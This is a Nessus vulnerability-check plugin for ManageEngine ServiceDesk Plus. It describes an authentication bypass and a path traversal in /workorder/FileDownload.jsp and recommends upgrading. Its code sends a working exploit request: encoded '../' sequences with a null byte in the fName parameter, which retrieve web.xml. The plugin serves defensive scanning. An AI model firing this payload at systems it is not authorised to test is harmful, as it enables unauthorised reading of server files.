#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(86886);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2016/04/28 18:52:11 $");

  script_osvdb_id(128249);

  script_name(english:"ManageEngine ServiceDesk Plus Multiple Vulnerabilities");
  script_summary(english:"Attempts to retrieve a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by multiple vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The version of ManageEngine ServiceDesk Plus running on the remote web
server is affected by multiple vulnerabilities :

  - A security bypass vulnerability exists due to a
    misconfiguration in web.xml that allows access to the
    URL /workorder/FileDownload.jsp without requiring
    authentication.

  - A path traversal vulnerability exists in the servlet
    that processes the URL /workorder/FileDownload.jsp due
    to improper sanitization of input to the 'fName'
    parameter.

Consequently, an unauthenticated, remote attacker can exploit these
issues, by using a crafted directory traversal sequence, to retrieve
arbitrary files through the web server, subject to the privileges that
it operates under.");
  script_set_attribute(attribute:"see_also", value:"https://www.manageengine.com/products/service-desk/readme-9.1.html");
#https://packetstormsecurity.com/files/133853/ManageEngine-ServiceDesk-Plus-9.1-Build-9110-Path-Traversal.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?c6e05052");
  script_set_attribute(attribute:"solution", value:
"Upgrade to ManageEngine ServiceDesk Plus version 9.1 build 9111 or
later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/09/28");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/09/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/11/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:zohocorp:servicedesk_plus");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015-2016 Tenable Network Security, Inc.");

  script_dependencies("manageengine_servicedesk_detect.nasl","os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("installed_sw/manageengine_servicedesk");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

# The vulnerability is due to file path parsing in OS-specific way. 
# It looks like only Windows version is affected. 
# Skip non-Windows targets, but will continue if OS is not determined
# or if report_paranoia >= 2.
if(report_paranoia < 2)
{
  os = get_kb_item("Host/OS");
  if(os && "windows" >!< tolower(os))
    audit(AUDIT_OS_NOT, "Windows");
}
    
kbname  = "manageengine_servicedesk";
appname = "ManageEngine ServiceDesk Plus";

# Plugin will exit if ServiceDesk not detected on the host
get_install_count(app_name:kbname, exit_if_zero:TRUE);

# Branch off each http port
# Plugin will exit if ServiceDesk not detected on this http port
port = get_http_port(default:8080);
install = get_single_install(
  app_name            : kbname,
  port                : port
);

dir = install["path"];
install_url =  build_url(port:port, qs:dir);

# Try to retrieve web.xml, which should not be publicly accessible.
# File is supposed to be downloaded from 
# <PRODUCT_INSTALL_DIR>/server/default/log/support/<USER>/<fName>.zip
fs = '%2f';
file = '..' + fs + '..' + fs + '..' + fs + '..' + fs + '..' + fs +
      'applications' + fs +
      'extracted' + fs +
      'AdventNetServiceDesk.eear' + fs +
      'AdventNetServiceDeskWC.ear' + fs +
      'AdventNetServiceDesk.war' + fs +
      'WEB-INF' + fs +
      'web.xml%00';

pattern = 'org.apache.jsp.workorder.FileDownload_jsp';
url = dir + '/workorder/FileDownload.jsp?' +
  'module=support&' +
  'fName=' + file;
res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);

req = http_last_sent_request();
if (pattern >< res[2])
{
  security_report_v4(
    port       : port,
    severity   : SECURITY_WARNING,
    request    : make_list(req),
    output     : res[2],
    generic    : TRUE,
    line_limit : 50
  );
}
else
  audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, install_url);
